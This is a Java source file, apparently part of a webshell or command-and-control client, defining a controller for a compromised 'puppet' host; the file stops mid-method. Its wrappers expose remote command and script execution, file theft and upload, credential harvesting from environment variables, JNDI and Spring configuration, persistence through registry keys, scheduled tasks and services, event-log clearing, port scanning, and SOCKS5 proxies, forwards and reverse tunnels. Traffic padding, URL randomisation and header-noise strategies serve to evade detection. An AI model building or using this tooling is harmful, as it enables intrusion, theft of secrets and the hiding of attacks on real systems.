package org.leo.core.puppet.impl;

import org.leo.core.engine.proxy.NetworkProxyManager;
import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.entity.Puppet;
import org.leo.core.net.Communication;
import org.leo.core.net.layer.RequestLayer;
import org.leo.core.net.layer.ResponseLayer;
import org.leo.core.net.layer.UrlStrategy;
import org.leo.core.net.layer.PaddingStrategy;
import org.leo.core.net.layer.HeaderNoiseStrategy;
import org.leo.core.payload.PayloadCodec;
import org.leo.core.puppet.AbstractPuppetNode;
import org.leo.core.puppet.capability.BasicInfoCapable;
import org.leo.core.puppet.capability.WebRuntimeManageCapable;
import org.leo.core.puppet.capability.ComponentInvokeCapable;
import org.leo.core.puppet.capability.ComponentManageCapable;
import org.leo.core.puppet.capability.CredentialHarvestCapable;
import org.leo.core.puppet.capability.DockerCapable;
import org.leo.core.puppet.capability.EventLogCapable;
import org.leo.core.puppet.capability.FileCapable;
import org.leo.core.puppet.capability.FirewallCapable;
import org.leo.core.puppet.capability.HttpProxyCapable;
import org.leo.core.puppet.capability.HttpSenderCapable;
import org.leo.core.puppet.capability.InstalledSoftwareCapable;
import org.leo.core.puppet.capability.JavaPluginCapable;
import org.leo.core.puppet.capability.HostScopedCapable;
import org.leo.core.puppet.capability.LoadedComponentCacheCapable;
import org.leo.core.puppet.capability.LocalForwardCapable;
import org.leo.core.puppet.capability.NetworkConnectionCapable;
import org.leo.core.puppet.capability.NetworkInfoCapable;
import org.leo.core.puppet.capability.NetworkShareCapable;
import org.leo.core.puppet.capability.PersistenceCapable;
import org.leo.core.puppet.capability.ProcessCapable;
import org.leo.core.puppet.capability.RegistryCapable;
import org.leo.core.puppet.capability.ResourceCapable;
import org.leo.core.puppet.capability.ReverseTunnelCapable;
import org.leo.core.puppet.capability.ScanCapable;
import org.leo.core.puppet.capability.ScheduledTaskCapable;
import org.leo.core.puppet.capability.ScriptCapable;
import org.leo.core.puppet.capability.ServiceCapable;
import org.leo.core.puppet.capability.SqlCapable;
import org.leo.core.puppet.capability.Socks5ProxyCapable;
import org.leo.core.puppet.capability.SuidCapabilityCapable;
import org.leo.core.puppet.capability.TerminalCapable;
import org.leo.core.puppet.capability.UserAccountCapable;
import org.leo.core.puppet.service.*;
import org.leo.core.rpc.PuppetRpcErrorCodes;
import org.leo.core.util.request.ComponentClassNameStrategy;

import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.function.Consumer;

public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapable, TerminalCapable, FileCapable, NetworkInfoCapable, SqlCapable, ScriptCapable, ResourceCapable, HttpSenderCapable, ProcessCapable, RegistryCapable, ScheduledTaskCapable, ServiceCapable, EventLogCapable, UserAccountCapable, FirewallCapable, NetworkConnectionCapable, NetworkShareCapable, InstalledSoftwareCapable, PersistenceCapable, DockerCapable, SuidCapabilityCapable, HttpProxyCapable, LocalForwardCapable, ReverseTunnelCapable, Socks5ProxyCapable, ScanCapable, ComponentInvokeCapable, ComponentManageCapable, WebRuntimeManageCapable, JavaPluginCapable, CredentialHarvestCapable, HostScopedCapable, LoadedComponentCacheCapable {

    /** 最大请求总数，包含首次请求。 */
    private int maxReqCount = Puppet.DEFAULT_MAX_REQUEST_COUNT;

    List<RequestLayer> requestLayers = new ArrayList<>();
    List<ResponseLayer> responseLayers = new ArrayList<>();

    private static final int MAX_LOADED_COMPONENT_HOSTS = 128;
    private static final long LOADED_COMPONENT_HOST_TTL_MILLIS = 30L * 60L * 1000L;
    private final LinkedHashMap<String, Set<String>> allLoadedComponent =
            new LinkedHashMap<String, Set<String>>(16, 0.75f, true);
    private final Map<String, Long> loadedComponentHostLastSeen = new HashMap<String, Long>();
    private final JavaPuppetServiceRegistry serviceRegistry = new JavaPuppetServiceRegistry();
    private final ComponentLoadRegistry componentLoadRegistry = new ComponentLoadRegistry();
    BasicInfoService basicInfoService;
    CommandService commandService;
    ComponentService componentService;
    FileService fileService;
    SqlService sqlService;
    TestConnService testConnService;
    ScanService scanService;
    ResourceService resourceService;
    WebRuntimeManageService webRuntimeManageService;
    ExecScriptService execScriptService;
    HttpRequestService httpRequestService;
    CredentialHarvestService credentialHarvestService;
    NetworkInfoService networkInfoService;
    HttpSenderService httpSenderService;
    ProcessService processService;
    RegistryService registryService;
    ScheduledTaskService scheduledTaskService;
    ServiceManagerService serviceManagerService;
    EventLogService eventLogService;
    UserAccountService userAccountService;
    FirewallService firewallService;
    NetworkShareService networkShareService;
    InstalledSoftwareService installedSoftwareService;
    DockerContainerService dockerContainerService;
    SuidCapabilityService suidCapabilityService;
    PersistenceService persistenceService;
    NetworkConnectionService networkConnectionService;
    private volatile String hostId;
    private volatile Consumer<String> hostIdChangeListener = ignored -> { };

    private Communication communication;
    private PayloadCodec payloadCodec;
    private final NetworkProxyManager networkProxyManager = new NetworkProxyManager(this);

    /** per-puppet URL 随机化策略 */
    private UrlStrategy urlStrategy;

    /** per-puppet 请求体 Padding 策略 */
    private PaddingStrategy paddingStrategy;

    /** per-puppet Header 噪声注入策略 */
    private HeaderNoiseStrategy headerNoiseStrategy;

    /** per-puppet Component 运行时类名画像 */
    private ComponentClassNameStrategy componentClassNameStrategy;

    public Communication getCommunication() {
        return communication;
    }

    public void setCommunication(Communication communication) {
        this.communication = communication;

    }

    public void setPayloadCodec(PayloadCodec payloadCodec) {
        this.payloadCodec = payloadCodec;
        serviceRegistry.setPayloadCodec(payloadCodec);
    }


    @Override
    public String getHostId() {
        return hostId;
    }


    @Override
    public void setHostId(String hostId) {
        String previous = this.hostId;
        this.hostId = hostId;
        if (!Objects.equals(previous, hostId)
                && communication instanceof org.leo.core.net.impl.HttpCommunication http) {
            http.resetSessionAffinity();
        }
        serviceRegistry.setHostId(hostId);
        if (!Objects.equals(previous, hostId)) hostIdChangeListener.accept(hostId);
    }

    @Override
    public void setHostIdChangeListener(Consumer<String> listener) {
        this.hostIdChangeListener = listener == null ? ignored -> { } : listener;
    }

    public synchronized void initService(){
        if (httpSenderService != null) {
            httpSenderService.close();
        }
        basicInfoService=new BasicInfoService(communication,requestLayers,responseLayers);
        commandService=new CommandService(communication,requestLayers,responseLayers);
        componentService=new ComponentService(communication,requestLayers,responseLayers);
        fileService=new FileService(communication,requestLayers,responseLayers);
        sqlService=new SqlService(communication,requestLayers,responseLayers);
        testConnService=new TestConnService(communication,requestLayers,responseLayers);
        scanService=new ScanService(communication,requestLayers,responseLayers);
        resourceService=new ResourceService(communication,requestLayers,responseLayers);
        webRuntimeManageService=new WebRuntimeManageService(communication,requestLayers,responseLayers);
        execScriptService=new ExecScriptService(communication,requestLayers,responseLayers);
        httpRequestService=new HttpRequestService(communication,requestLayers,responseLayers);
        credentialHarvestService=new CredentialHarvestService(communication,requestLayers,responseLayers);
        networkInfoService=new NetworkInfoService(communication,requestLayers,responseLayers);
        httpSenderService=new HttpSenderService(communication,requestLayers,responseLayers);
        processService=new ProcessService(communication,requestLayers,responseLayers);
        registryService=new RegistryService(communication,requestLayers,responseLayers);
        scheduledTaskService=new ScheduledTaskService(communication,requestLayers,responseLayers);
        serviceManagerService=new ServiceManagerService(communication,requestLayers,responseLayers);
        eventLogService=new EventLogService(communication,requestLayers,responseLayers);
        userAccountService=new UserAccountService(communication,requestLayers,responseLayers);
        firewallService=new FirewallService(communication,requestLayers,responseLayers);
        networkShareService=new NetworkShareService(communication,requestLayers,responseLayers);
        installedSoftwareService=new InstalledSoftwareService(communication,requestLayers,responseLayers);
        dockerContainerService=new DockerContainerService(communication,requestLayers,responseLayers);
        suidCapabilityService=new SuidCapabilityService(communication,requestLayers,responseLayers);
        persistenceService=new PersistenceService(communication,requestLayers,responseLayers);
        networkConnectionService=new NetworkConnectionService(communication,requestLayers,responseLayers);

        serviceRegistry.replace(componentLoadRegistry,
                basicInfoService, commandService, componentService, fileService,
                sqlService, testConnService, scanService, resourceService,
                webRuntimeManageService, execScriptService, httpRequestService,
                credentialHarvestService, networkInfoService, httpSenderService,
                processService, registryService, scheduledTaskService,
                serviceManagerService, eventLogService, userAccountService,
                firewallService, networkShareService, installedSoftwareService,
                dockerContainerService, suidCapabilityService,
                persistenceService, networkConnectionService);
        serviceRegistry.setPayloadCodec(payloadCodec);
        serviceRegistry.setHostIdMismatchRecovery(this::recoverHostAffinity);

        if (hostId != null) {
            setHostId(hostId);
        }
        for (Map.Entry<String, Set<String>> entry : allLoadedComponent.entrySet()) {
            syncLoadedComponentsToServices(entry.getKey(), entry.getValue());
        }

        applyUrlStrategyToAll();
        applyPaddingStrategyToAll();
        applyHeaderNoiseStrategyToAll();
        applyComponentClassNameStrategyToAll();
        applyMaxReqCountToAll();
    }

    private synchronized Map<String, Object> recoverHostAffinity(String expectedHostId) {
        if (!Objects.equals(expectedHostId, hostId)) {
            return reboundResult(expectedHostId, hostId);
        }

        Map<String, Object> ping = testConnService.testConn();
        Object code = ping == null ? null : ping.get("code");
        String newHostId = ping == null ? null : normalizedText(ping.get("hostId"));
        if (!(code instanceof Number) || ((Number) code).intValue() != 200 || newHostId == null) {
            Map<String, Object> unavailable = new LinkedHashMap<>();
            unavailable.put("code", Integer.valueOf(503));
            unavailable.put("errorCode", PuppetRpcErrorCodes.HOST_ID_UNAVAILABLE);
            unavailable.put("expectedHostId", expectedHostId);
            unavailable.put("msg", "目标实例已变化，但重新握手未能获得有效 HostId，请稍后重试");
            return unavailable;
        }

        componentLoadRegistry.clear();
        allLoadedComponent.clear();
        loadedComponentHostLastSeen.clear();
        setHostId(newHostId);
        addLoadedComponent(newHostId, componentNames(ping.get("components")));
        return reboundResult(expectedHostId, newHostId);
    }

    private Map<String, Object> reboundResult(String previousHostId, String currentHostId) {
        Map<String, Object> rebound = new LinkedHashMap<>();
        rebound.put("code", Integer.valueOf(409));
        rebound.put("errorCode", PuppetRpcErrorCodes.HOST_ID_REBOUND);
        rebound.put("previousHostId", previousHostId);
        rebound.put("hostId", currentHostId);
        rebound.put("msg", "目标实例已变化，会话已重新绑定，请重试当前操作");
        return rebound;
    }

    private Set<String> componentNames(Object value) {
        Set<String> names = new HashSet<>();
        if (value instanceof Collection<?> collection) {
            for (Object item : collection) addComponentName(names, item);
        } else if (value != null && value.getClass().isArray()) {
            for (int index = 0; index < Array.getLength(value); index++) {
                addComponentName(names, Array.get(value, index));
            }
        }
        return names;
    }

    private void addComponentName(Set<String> names, Object value) {
        String name = normalizedText(value);
        if (name != null) names.add(name);
    }

    private String normalizedText(Object value) {
        if (value == null) return null;
        String text = String.valueOf(value).trim();
        return text.isEmpty() ? null : text;
    }

    /**
     * 设置 UrlStrategy 并同步到所有已初始化的 Service
     */
    public void setUrlStrategy(UrlStrategy urlStrategy) {
        this.urlStrategy = urlStrategy;
        applyUrlStrategyToAll();
    }

    public UrlStrategy getUrlStrategy() {
        return urlStrategy;
    }

    /**
     * 设置 PaddingStrategy 并同步到所有已初始化的 Service
     */
    public void setPaddingStrategy(PaddingStrategy paddingStrategy) {
        this.paddingStrategy = paddingStrategy;
        applyPaddingStrategyToAll();
    }

    public PaddingStrategy getPaddingStrategy() {
        return paddingStrategy;
    }

    /**
     * 设置 HeaderNoiseStrategy 并同步到所有已初始化的 Service
     */
    public void setHeaderNoiseStrategy(HeaderNoiseStrategy headerNoiseStrategy) {
        this.headerNoiseStrategy = headerNoiseStrategy;
        applyHeaderNoiseStrategyToAll();
    }

    public HeaderNoiseStrategy getHeaderNoiseStrategy() {
        return headerNoiseStrategy;
    }

    public void setComponentClassNameStrategy(ComponentClassNameStrategy strategy) {
        this.componentClassNameStrategy = strategy;
        applyComponentClassNameStrategyToAll();
    }

    public ComponentClassNameStrategy getComponentClassNameStrategy() {
        return componentClassNameStrategy;
    }

    private void applyUrlStrategyToAll() {
        serviceRegistry.setUrlStrategy(urlStrategy);
    }

    private void applyPaddingStrategyToAll() {
        serviceRegistry.setPaddingStrategy(paddingStrategy);
    }

    private void applyHeaderNoiseStrategyToAll() {
        serviceRegistry.setHeaderNoiseStrategy(headerNoiseStrategy);
    }

    private void applyComponentClassNameStrategyToAll() {
        serviceRegistry.setComponentClassNameStrategy(componentClassNameStrategy);
    }

    private void applyMaxReqCountToAll() {
        serviceRegistry.setMaxReqCount(maxReqCount);
    }

    @Override
    public synchronized void addLoadedComponent(String hostId, Set<String> loadedComponent){
        if (hostId == null || loadedComponent == null) return;
        sweepExpiredLoadedComponentHosts(System.currentTimeMillis());
        allLoadedComponent.put(hostId, new HashSet<String>(loadedComponent));
        loadedComponentHostLastSeen.put(hostId, Long.valueOf(System.currentTimeMillis()));
        while (allLoadedComponent.size() > MAX_LOADED_COMPONENT_HOSTS) {
            Iterator<String> iterator = allLoadedComponent.keySet().iterator();
            if (!iterator.hasNext()) break;
            String evictedHost = iterator.next();
            iterator.remove();
            loadedComponentHostLastSeen.remove(evictedHost);
        }
        // 同步到所有 ComponentService 实例，避免重复加载
        syncLoadedComponentsToServices(hostId, loadedComponent);
    }

    private void syncLoadedComponentsToServices(String hostId, Set<String> componentNames) {
        serviceRegistry.seedLoadedComponents(hostId, componentNames);
    }

    public List<RequestLayer> getRequestLayers() {
        return requestLayers;
    }

    public void setRequestLayers(List<RequestLayer> requestLayers) {
        this.requestLayers = requestLayers;
        serviceRegistry.setRequestLayers(requestLayers);
    }

    public List<ResponseLayer> getResponseLayers() {
        return responseLayers;
    }

    public void setResponseLayers(List<ResponseLayer> responseLayers) {
        this.responseLayers = responseLayers;
        serviceRegistry.setResponseLayers(responseLayers);
    }

    public int getMaxReqCount() {
        return maxReqCount;
    }



    public void setMaxReqCount(int maxReqCount) {
        this.maxReqCount = Puppet.requireValidMaxRequestCount(maxReqCount);
        applyMaxReqCountToAll();
    }

    @Override
    public synchronized Set<String> getLoadedComponents() {
        sweepExpiredLoadedComponentHosts(System.currentTimeMillis());
        // 聚合所有 ComponentService 实例的已加载组件，避免仅读单一 service 导致漏显
        Set<String> merged = serviceRegistry.loadedComponents(hostId);
        if (!merged.isEmpty()) return merged;
        // 服务初始化前，组件状态暂存在节点级缓存。
        Set<String> set = allLoadedComponent.get(hostId);
        return set != null ? new HashSet<String>(set) : new HashSet<String>();
    }

    private void sweepExpiredLoadedComponentHosts(long now) {
        Iterator<Map.Entry<String, Long>> iterator = loadedComponentHostLastSeen.entrySet().iterator();
        while (iterator.hasNext()) {
            Map.Entry<String, Long> entry = iterator.next();
            Long lastSeen = entry.getValue();
            if (lastSeen == null || now - lastSeen.longValue() > LOADED_COMPONENT_HOST_TTL_MILLIS) {
                allLoadedComponent.remove(entry.getKey());
                iterator.remove();
            }
        }
    }

    @Override
    public Map<String, Object> invokeComponent(String componentId, Map<String, Object> params) throws Exception {
        return componentService.invokeComponent(componentId,params);
    }




    @Override
    public Map<String, Object> testConnection() {
        return testConnService.testConn();
    }


    @Override
    public Map<String, Object> getBasicInfo() throws Exception {
        return basicInfoService.basicInfo();
    }

    @Override
    public Map<String, Object> startScanPort(String scanHost, int[] scanPorts, int scanTimeout, int threadsNum) throws Exception {
        return scanService.startScanPort(scanHost, scanPorts, scanTimeout, threadsNum);
    }

    @Override
    public Map<String, Object> queryScanPortResult(String taskId) throws Exception {
        return scanService.queryScanPortResult(taskId);
    }

    @Override
    public Map<String, Object> pauseScanPort(String taskId) throws Exception {
        return scanService.pauseScanPort(taskId);
    }

    @Override
    public Map<String, Object> resumeScanPort(String taskId) throws Exception {
        return scanService.resumeScanPort(taskId);
    }

    @Override
    public Map<String, Object> stopScanPort(String taskId) throws Exception {
        return scanService.stopScanPort(taskId);
    }

    @Override
    public Map<String, Object> scanReachableHost(ArrayList<String> scanHostsList, int scanTimeout) throws Exception {
        return scanService.scanReachableHost(scanHostsList, scanTimeout);
    }

    @Override
    public Map<String, Object> loadComponent(String componentId) throws Exception {
        return componentService.loadComponent(componentId);

    }

    @Override
    public Map<String, Object> reloadComponent(String componentId) throws Exception {
        return componentService.reloadComponent(componentId);
    }

    @Override
    public void unloadComponent(String componentId) throws Exception {
        componentLoadRegistry.invalidate(hostId, componentId);
    }

    @Override
    public Map<String, Object> getFileSystemProfile() throws Exception {
        return fileService.getFileSystemProfile();
    }

    @Override
    public Map<String, Object> getFileList(String path) throws Exception {
        return fileService.getFileList(path);
    }

    @Override
    public Map<String, Object> fileDownloadChunk(String path, long size, long offset) throws Exception {
        return fileService.fileDownloadChunk(path, size, offset);
    }

    @Override
    public Map<String, Object> fileUploadChunk(String path, long offset, byte[] data) throws Exception {
        return fileService.fileUploadChunk(path, offset, data);
    }

    @Override
    public Map<String, Object> getFileMD5(String path) throws Exception {
        return fileService.getFileMD5(path);
    }

    @Override
    public Map<String, Object> createDir(String dirName) throws Exception {
        return fileService.createDir(dirName);
    }

    @Override
    public Map<String, Object> deleteFile(String path) throws Exception {
        return fileService.deleteFile(path);
    }

    @Override
    public Map<String, Object> copyFile(String srcPath, String destPath, String conflictStrategy) throws Exception {
        return fileService.copyFile(srcPath, destPath, conflictStrategy);
    }

    @Override
    public Map<String, Object> moveFile(String srcPath, String newPath, String conflictStrategy) throws Exception {
        return fileService.moveFile(srcPath, newPath, conflictStrategy);
    }

    @Override
    public Map<String, Object> createFile(String path, String content) throws Exception {
        return fileService.createFile(path, content);
    }

    @Override
    public Map<String, Object> compressFile(String src, String des, String excludePattern) throws Exception {
        return fileService.compress(src, des, excludePattern);
    }

    @Override
    public Map<String, Object> editFile(String path, String content) throws Exception {
        return fileService.editFile(path, content);
    }

    @Override
    public Map<String, Object> decompressFile(String src, String des, String format) throws Exception {
        return fileService.decompress(src, des, format);
    }

    @Override
    public Map<String, Object> execCommand(String type, String cmd, String processId) throws Exception {
        if ("write".equals(type)) return commandService.write(cmd, processId);
        if ("read".equals(type))  return commandService.read(processId, parseTerminalReadWait(cmd));
        if ("resize".equals(type)) return commandService.resize(cmd, processId);
        if ("stop".equals(type))  return commandService.stop(processId);
        return new HashMap<String, Object>();
    }

    private int parseTerminalReadWait(String value) {
        if (value == null || value.trim().isEmpty()) return 0;
        try {
            return Math.max(0, Math.min(2000, Integer.parseInt(value.trim())));
        } catch (NumberFormatException ignored) {
            return 0;
        }
    }

    @Override
    public Map<String, Object> execSimpleCommand(String cmd) throws Exception {
        return commandService.execSimpleCommand(cmd);
    }

    @Override
    public Map<String, Object> execSimpleCommand(String cmd, int timeoutSeconds) throws Exception {
        return commandService.execSimpleCommand(cmd, timeoutSeconds);
    }

    @Override
    public Map<String, Object> execScript(String language, String script) throws Exception {
        return execScriptService.execScript(language, script);
    }

    @Override
    public Map<String, Object> executeSql(org.leo.core.puppet.database.DatabaseConnectionSpec connection,
                                          String sqlScript) throws Exception {
        return sqlService.executeSql(connection, sqlScript);
    }

    @Override
    public Map<String, Object> executeSql(org.leo.core.puppet.database.DatabaseConnectionSpec connection,
                                          org.leo.core.puppet.database.SqlCommand command) throws Exception {
        return sqlService.executeSql(connection, command);
    }

    @Override
    public Map<String, Object> inspectDatabaseRuntime(Map<String, Object> connection) throws Exception {
        return sqlService.inspectRuntime(connection);
    }

    @Override
    public Map<String, Object> getClassBytecode(String className) throws Exception {
        return resourceService.getClassBytecode(className);
    }

    @Override
    public Map<String, Object> getResource(String resourcePath) throws Exception {
        return resourceService.getResource(resourcePath);
    }
    @Override
    public Map<String, Object> inspectWebRuntime(String runtimeFamily, String runtimeVersion,
                                                 String webFramework) throws Exception {
        return webRuntimeManageService.inspect(runtimeFamily, runtimeVersion, webFramework);
    }

    @Override
    public Map<String, Object> removeWebRuntimeComponent(String runtimeFamily, String runtimeVersion,
                                                          String webFramework, String componentType,
                                                          String contextName, String identifier) throws Exception {
        return webRuntimeManageService.remove(runtimeFamily, runtimeVersion, webFramework,
                componentType, contextName, identifier);
    }

    @Override
    public Map<String, Object> startSocks5Proxy(int port) throws Exception {
        return networkProxyManager.startSocks5Proxy(port);
    }

    @Override
    public Map<String, Object> stopSocks5Proxy() {
        return networkProxyManager.stopSocks5Proxy();
    }

    @Override
    public Map<String, Object> getSocks5ProxyStatus() {
        return networkProxyManager.getSocks5ProxyStatus();
    }

    @Override
    public Socks5ProxyStatistics.StatisticsSnapshot getSocks5ProxyStatistics() {
        return networkProxyManager.getSocks5ProxyStatistics();
    }

    @Override
    public Map<String, Object> startHttpProxy(int port) throws Exception {
        return networkProxyManager.startHttpProxy(port);
    }

    @Override
    public Map<String, Object> stopHttpProxy() {
        return networkProxyManager.stopHttpProxy();
    }

    @Override
    public Map<String, Object> getHttpProxyStatus() {
        return networkProxyManager.getHttpProxyStatus();
    }

    @Override
    public Socks5ProxyStatistics.StatisticsSnapshot getHttpProxyStatistics() {
        return networkProxyManager.getHttpProxyStatistics();
    }

    @Override
    public Map<String, Object> startLocalForward(int localPort, String targetHost, int targetPort) throws Exception {
        return networkProxyManager.startLocalForward(localPort, targetHost, targetPort);
    }

    @Override
    public Map<String, Object> stopLocalForward(int localPort) {
        return networkProxyManager.stopLocalForward(localPort);
    }

    @Override
    public Map<String, Object> stopAllLocalForwards() {
        return networkProxyManager.stopAllLocalForwards();
    }

    @Override
    public List<Map<String, Object>> listLocalForwards() {
        return networkProxyManager.listLocalForwards();
    }

    @Override
    public Socks5ProxyStatistics.StatisticsSnapshot getLocalForwardStatistics(int localPort) {
        return networkProxyManager.getLocalForwardStatistics(localPort);
    }

    @Override
    public Map<String, Object> startReverseTunnel(int remoteListenPort, String bindAddr,
                                                   String forwardHost, int forwardPort) throws Exception {
        return networkProxyManager.startReverseTunnel(remoteListenPort, bindAddr, forwardHost, forwardPort);
    }

    @Override
    public Map<String, Object> stopReverseTunnel(String listenId) {
        return networkProxyManager.stopReverseTunnel(listenId);
    }

    @Override
    public Map<String, Object> stopAllReverseTunnels() {
        return networkProxyManager.stopAllReverseTunnels();
    }

    @Override
    public List<Map<String, Object>> listReverseTunnels() {
        return networkProxyManager.listReverseTunnels();
    }

    @Override
    public Socks5ProxyStatistics.StatisticsSnapshot getReverseTunnelStatistics(String listenId) {
        return networkProxyManager.getReverseTunnelStatistics(listenId);
    }

    // ==================== HTTP 请求 ====================

    @Override
    public Map<String, Object> httpRequest(String method, String url, Map<String, String> headers,
                                           String body, int connectTimeout, int readTimeout,
                                           boolean followRedirects) throws Exception {
        return httpRequestService.httpRequest(method, url, headers, body, connectTimeout, readTimeout, followRedirects);
    }

    public Map<String, Object> httpGet(String url, Map<String, String> headers) throws Exception {
        return httpRequestService.httpGet(url, headers);
    }

    public Map<String, Object> httpPost(String url, Map<String, String> headers, String body) throws Exception {
        return httpRequestService.httpPost(url, headers, body);
    }

    public Map<String, Object> httpHead(String url, Map<String, String> headers) throws Exception {
        return httpRequestService.httpHead(url, headers);
    }

    // ==================== 凭据采集 ====================

    @Override
    public Map<String, Object> harvestCredentials(String filter) throws Exception {
        return credentialHarvestService.harvestAll(filter);
    }

    @Override
    public Map<String, Object> harvestDataSources() throws Exception {
        return credentialHarvestService.harvestDataSources();
    }

    @Override
    public Map<String, Object> harvestSystemProperties(String filter) throws Exception {
        return credentialHarvestService.harvestSystemProperties(filter);
    }

    @Override
    public Map<String, Object> harvestEnvVars(String filter) throws Exception {
        return credentialHarvestService.harvestEnvVars(filter);
    }

    @Override
    public Map<String, Object> harvestJndi() throws Exception {
        return credentialHarvestService.harvestJndi();
    }

    @Override
    public Map<String, Object> harvestSpringEnv(String filter) throws Exception {
        return credentialHarvestService.harvestSpringEnv(filter);
    }

    // ==================== 网络信息 ====================

    @Override
    public Map<String, Object> collectNetworkInfo() throws Exception {
        return networkInfoService.collectAll();
    }

    public Map<String, Object> collectNetworkInterfaces() throws Exception {
        return networkInfoService.collectInterfaces();
    }

    public Map<String, Object> collectArp() throws Exception {
        return networkInfoService.collectArp();
    }

    public Map<String, Object> collectRoutes() throws Exception {
        return networkInfoService.collectRoutes();
    }

    public Map<String, Object> collectDnsConfig() throws Exception {
        return networkInfoService.collectDnsConfig();
    }

    public Map<String, Object> collectHosts() throws Exception {
        return networkInfoService.collectHosts();
    }

    public Map<String, Object> resolveDns(String hostname) throws Exception {
        return networkInfoService.resolveDns(hostname);
    }

    // ==================== HTTP 发包（Repeater + Fuzzer） ====================

    @Override
    public Map<String, Object> sendRawHttp(String rawHttp, String targetHost, int targetPort,
                                           boolean useTls, boolean followRedirects,
                                           int connectTimeout, int readTimeout) throws Exception {
        return httpSenderService.sendRawHttp(rawHttp, targetHost, targetPort, useTls, followRedirects, connectTimeout, readTimeout);
    }

    @Override
    public Map<String, Object> startFuzz(String rawHttp, Map<String, List<String>> payloads,
                                         String targetHost, int targetPort, boolean useTls,
                                         int threads, int delayMs,
                                         Map<String, Object> matchRules) throws Exception {
        return httpSenderService.startFuzz(rawHttp, payloads, targetHost, targetPort, useTls, threads, delayMs, matchRules);
    }

    @Override
    public Map<String, Object> queryFuzz(String taskId) {
        return httpSenderService.queryFuzz(taskId);
    }

    @Override
    public Map<String, Object> stopFuzz(String taskId) {
        return httpSenderService.stopFuzz(taskId);
    }

    // ==================== 进程管理 ====================

    @Override
    public Map<String, Object> listProcesses() throws Exception {
        return processService.listProcesses();
    }

    @Override
    public Map<String, Object> findProcesses(String name, int pid, int port) throws Exception {
        return processService.find(name, pid, port);
    }

    @Override
    public Map<String, Object> killProcess(int pid, boolean force) throws Exception {
        return processService.killProcess(pid, force);
    }

    // ==================== 注册表管理 ====================

    @Override
    public Map<String, Object> queryRegistry(String keyPath, boolean recursive) throws Exception {
        return registryService.query(keyPath, recursive);
    }

    @Override
    public Map<String, Object> searchRegistry(String keyPath, String pattern, String searchTarget, int maxResults) throws Exception {
        return registryService.search(keyPath, pattern, searchTarget, maxResults);
    }

    @Override
    public Map<String, Object> addRegistry(String keyPath, String valueName, String valueType, String valueData, boolean force) throws Exception {
        return registryService.add(keyPath, valueName, valueType, valueData, force);
    }

    @Override
    public Map<String, Object> deleteRegistry(String keyPath, String valueName, boolean force) throws Exception {
        return registryService.delete(keyPath, valueName, force);
    }

    @Override
    public Map<String, Object> exportRegistry(String keyPath) throws Exception {
        return registryService.export(keyPath);
    }

    // ==================== 计划任务管理 ====================

    @Override
    public Map<String, Object> listScheduledTasks() throws Exception {
        return scheduledTaskService.list();
    }

    @Override
    public Map<String, Object> queryScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.query(taskName);
    }

    @Override
    public Map<String, Object> createScheduledTaskWindows(String taskName, String command, String schedule,
                                                           String modifier, String startTime, String startDate,
                                                           String runAs, boolean force) throws Exception {
        return scheduledTaskService.createWindows(taskName, command, schedule, modifier, startTime, startDate, runAs, force);
    }

    @Override
    public Map<String, Object> createScheduledTaskLinux(String cronExpression, String command) throws Exception {
        return scheduledTaskService.createLinux(cronExpression, command);
    }

    @Override
    public Map<String, Object> deleteScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.delete(taskName);
    }

    @Override
    public Map<String, Object> runScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.run(taskName);
    }

    @Override
    public Map<String, Object> enableScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.enable(taskName);
    }

    @Override
    public Map<String, Object> disableScheduledTask(String taskName) throws Exception {
        return scheduledTaskService.disable(taskName);
    }

    // ==================== 服务管理 ====================

    @Override
    public Map<String, Object> listServices() throws Exception {
        return serviceManagerService.list();
    }

    @Override
    public Map<String, Object> queryService(String serviceName) throws Exception {
        return serviceManagerService.query(serviceName);
    }

    @Override
    public Map<String, Object> startService(String serviceName) throws Exception {
        return serviceManagerService.start(serviceName);
    }

    @Override
    public Map<String, Object> stopService(String serviceName) throws Exception {
        return serviceManagerService.stop(serviceName);
    }

    @Override
    public Map<String, Object> restartService(String serviceName) throws Exception {
        return serviceManagerService.restart(serviceName);
    }

    @Override
    public Map<String, Object> enableService(String serviceName) throws Exception {
        return serviceManagerService.enable(serviceName);
    }

    @Override
    public Map<String, Object> disableService(String serviceName) throws Exception {
        return serviceManagerService.disable(serviceName);
    }

    @Override
    public Map<String, Object> createService(String serviceName, String binPath, String displayName, String startType) throws Exception {
        return serviceManagerService.create(serviceName, binPath, displayName, startType);
    }

    @Override
    public Map<String, Object> deleteService(String serviceName) throws Exception {
        return serviceManagerService.delete(serviceName);
    }

    // ==================== 事件日志管理 ====================

    @Override
    public Map<String, Object> listEventLogSources() throws Exception {
        return eventLogService.listSources();
    }

    @Override
    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId);
    }

    @Override
    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format);
    }

    @Override
    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format, int maxBytes) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format, maxBytes);
    }

    @Override
    public Map<String, Object> queryEventLog(String source, int maxEntries, String keyword,
                                             String level, String since, String until,
                                             String eventId, String format, int maxBytes,
                                             Long cursor, String direction,
                                             Integer minStatus, Integer maxStatus,
                                             String ipPrefix, String pathPrefix) throws Exception {
        return eventLogService.query(source, maxEntries, keyword, level, since, until, eventId, format, maxBytes,
                cursor, direction, minStatus, maxStatus, ipPrefix, pathPrefix);
    }

    @Override
    public Map<String, Object> getEventLogStats(String source) throws Exception {
        return eventLogService.stats(source);
    }

    @Override
    public Map<String, Object> clearEventLog(String source) throws Exception {
        return eventLogService.clear(source);
    }

    @Override
    public Map<String, Object> aggregateEventLog(String source, String format, String groupBy,
